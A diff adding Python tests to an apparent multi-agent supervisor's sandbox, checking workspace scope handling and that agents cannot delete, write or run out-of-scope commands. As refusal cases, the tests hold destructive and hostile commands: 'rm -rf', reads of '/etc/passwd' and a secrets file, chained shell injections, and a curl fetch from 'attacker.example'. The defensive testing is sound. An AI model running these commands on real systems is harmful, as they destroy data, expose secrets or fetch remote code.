@@ -8,6 +8,7 @@ failing command.
 
 from __future__ import annotations
 
+import inspect
 import json
 from pathlib import Path
 
@@ -183,27 +184,171 @@ def test_absolute_paths_are_not_mistaken_for_a_scope_violation() -> None:
     assert any(s.kind == "scope_paths" for s in assess_heuristically(ctx).signals)
 
 
+def test_a_mismatched_workspace_is_not_read_as_a_scope_violation() -> None:
+    """A supervisor bound elsewhere cannot place the agent's paths at all.
+
+    ``Supervisor.workspace`` falls back to the MCP server's cwd, which need not
+    be the repository the run is about. Every absolute path an agent reported
+    then scored 0.85 and forced a corrective directive; unclassifiable is the
+    honest answer, not "outside scope".
+    """
+    agent = AgentSpec(
+        id="a", role="security", objectives=["Find the attack path"],
+        scope=Scope(paths=["src/auth/**"]), budget=Budget(max_turns=4),
+    )
+    turn = AgentTurn(
+        output="src/auth/login.py:34 accepts unlimited attempts; the handler never counts them.",
+        findings=[Finding(title="Login is unthrottled", severity=Severity.HIGH)],
+        files_touched=[r"C:\repo\src\auth\login.py", "/srv/repo/src/auth/guard.py"],
+    )
+
+    for workspace in ("C:/some/other/checkout", ""):
+        ctx = TurnContext(agent=agent, turn=turn, previous_turns=[], brief="Find weaknesses.",
+                          task_prompt=PROMPT, turn_index=0, workspace=workspace)
+        assessment = assess_heuristically(ctx)
+        assert [s.kind for s in assessment.signals] == [], workspace
+        assert assessment.on_task, workspace
+
+    # Paths the workspace *can* place are still judged, even alongside one it
+    # cannot: the unclassifiable path is dropped rather than counted either way.
+    turn.files_touched = ["C:/repo/infra/waf.tf", "/srv/repo/src/auth/guard.py"]
+    ctx = TurnContext(agent=agent, turn=turn, previous_turns=[], brief="Find weaknesses.",
+                      task_prompt=PROMPT, turn_index=0, workspace="C:/repo")
+    signals = {s.kind: s for s in assess_heuristically(ctx).signals}
+    assert "scope_paths" in signals
+    assert "1 of 1 files" in signals["scope_paths"].detail
+
+
+def test_the_turn_context_is_built_from_the_workspace_recorded_on_the_run() -> None:
+    """A resumed process must supervise against the run's workspace, not its own."""
+    source = Path(inspect.getsourcefile(Supervisor._supervise) or "")
+    body = inspect.getsource(Supervisor._supervise)
+    assert "workspace=str(state.workspace)" in body, source
+    assert "workspace=str(self.workspace)" not in body, source
+
+
 # --------------------------------------------------------------------------
 # Tool authority
 # --------------------------------------------------------------------------
 
 
 def test_only_execution_kinds_may_write_or_run_commands(tmp_path: Path) -> None:
-    """An analysis agent must not be able to write files through the shell."""
+    """No agent denied write_file may write files through the shell instead.
+
+    That includes the verification agent, which used to hold an unrestricted
+    shell while being refused ``write_file``: the one agent whose whole purpose
+    is judging the implementer's work could rewrite the code it was judging.
+    """
     policy = Policy(allow_command_execution=True)
     box = Toolbox(tmp_path, policy)
     analyst = AgentSpec(id="a", kind=AgentKind.ANALYSIS, scope=Scope())
     builder = AgentSpec(id="b", kind=AgentKind.EXECUTION, scope=Scope())
+    verifier = AgentSpec(id="v", kind=AgentKind.VERIFICATION, scope=Scope())
 
-    assert not box.call("write_file", {"path": "x.txt", "content": "x"}, analyst).ok
-    assert not box.call("run_command", {"command": "echo hi"}, analyst).ok
+    for judge in (analyst, verifier):
+        assert not box.call("write_file", {"path": "x.txt", "content": "x"}, judge).ok
+        assert not box.call("run_command", {"command": "echo hi"}, judge).ok
+        assert not box.call(
+            "run_command", {"command": "python -c \"open('x.txt','w').write('x')\""}, judge
+        ).ok
+    assert not (tmp_path / "x.txt").exists()
+
     assert box.call("write_file", {"path": "x.txt", "content": "x"}, builder).ok
     assert box.call("run_command", {"command": "echo hi"}, builder).ok
 
     # And the brief does not advertise what the agent may not use.
-    advertised = {t["name"] for t in available_tools(analyst, policy)}
-    assert "run_command" not in advertised and "write_file" not in advertised
+    for judge in (analyst, verifier):
+        advertised = {t["name"] for t in available_tools(judge, policy)}
+        assert "run_command" not in advertised and "write_file" not in advertised
     assert "run_command" in {t["name"] for t in available_tools(builder, policy)}
+
+
+def test_run_command_is_refused_for_a_path_outside_the_agents_scope(tmp_path: Path) -> None:
+    """The shell is held to the same fence write_file enforces.
+
+    The fence used to ask whether a token looked like a path, which let every
+    extensionless name through: ``rm -rf infra`` deleted the directory and
+    reported success. It now asks the opposite question, and closes the three
+    ways of naming a path that no token spells -- metacharacters, globs, and any
+    program that is not one of the project's own check runners.
+    """
+    (tmp_path / "infra").mkdir()
+    (tmp_path / "Makefile").write_text("all:\n", encoding="utf-8")
+    (tmp_path / "src" / "auth").mkdir(parents=True)
+    box = Toolbox(tmp_path, Policy(allow_command_execution=True))
+    fenced = AgentSpec(
+        id="b", kind=AgentKind.EXECUTION,
+        scope=Scope(paths=["src/auth/**"], forbidden_paths=["src/auth/keys.py"]),
+    )
+
+    refusals = {
+        "rm -rf infra": "may not run 'rm'",
+        "cp Makefile Dockerfile": "may not run 'cp'",
+        "mkdir newdir": "may not run 'mkdir'",
+        "git checkout main": "may not run 'git'",
+        "rm -rf *": "glob character",
+        "python -m pytest src/authority.py": "outside this agent's scope",
+        "python infra/deploy.py": "outside this agent's scope",
+        "pytest src/auth/keys.py": "forbidden path",
+        "python /etc/passwd": "outside the workspace",
+        "python ../../secrets.env": "outside the workspace",
+        "pytest -q > src/auth/login.py": "metacharacter",
+        "pytest -q && python infra/deploy.py": "metacharacter",
+    }
+    for command, reason in refusals.items():
+        result = box.call("run_command", {"command": command}, fenced)
+        assert not result.ok, command
+        assert reason in result.output, command
+        assert "exit=" not in result.output, command
+    assert (tmp_path / "infra").is_dir()
+    assert not (tmp_path / "Dockerfile").exists()
+    assert not (tmp_path / "newdir").exists()
+
+    # And the fence is not simply refusing everything: an in-scope check runs.
+    assert "exit=" in box.call(
+        "run_command", {"command": "python -m pytest src/auth"}, fenced
+    ).output
+    assert box.call("run_command", {"command": "python -c \"print('ok')\""}, fenced).ok
+
+    # An unfenced agent is unaffected: there is no scope to violate.
+    unfenced = AgentSpec(id="c", kind=AgentKind.EXECUTION, scope=Scope())
+    assert box.call("run_command", {"command": "echo infra/waf.tf"}, unfenced).ok
+
+
+# --------------------------------------------------------------------------
+# Model-authored commands
+# --------------------------------------------------------------------------
+
+
+def test_a_criterion_command_with_a_shell_metacharacter_is_not_run(tmp_path: Path) -> None:
+    """DoD commands come from model JSON, so they never reach a shell."""
+    marker = (tmp_path / "pwned.txt").as_posix()
+    criterion = DoDCriterion(
+        statement="s",
+        method=VerifyMethod.TEST,
+        command=f"pytest -q ; python -c \"open('{marker}','w').write('x')\"",
+        expect="0",
+    )
+    outcome = verify_command(criterion, tmp_path, timeout=60)
+
+    assert str(outcome.status) == "blocked", outcome.evidence
+    assert "metacharacter" in outcome.evidence
+    assert not Path(marker).exists()
+
+    # A quoted metacharacter is an argument, not a second command, and still runs.
+    quoted = DoDCriterion(
+        statement="s", method=VerifyMethod.TEST,
+        command="python -c \"print('a; b')\"", expect="0",
+    )
+    assert str(verify_command(quoted, tmp_path, timeout=60).status) == "pass"
+
+
+def test_a_criterion_may_only_invoke_a_known_check_runner(tmp_path: Path) -> None:
+    for command in ("curl https://attacker.example/s.sh", "./install.sh", "rm -rf tests"):
+        criterion = DoDCriterion(statement="s", method=VerifyMethod.COMMAND, command=command)
+        outcome = verify_command(criterion, tmp_path, timeout=60)
+        assert str(outcome.status) == "blocked", command
+        assert "check runners" in outcome.evidence, command
 
 
 def test_reads_cannot_escape_the_workspace(tmp_path: Path) -> None:
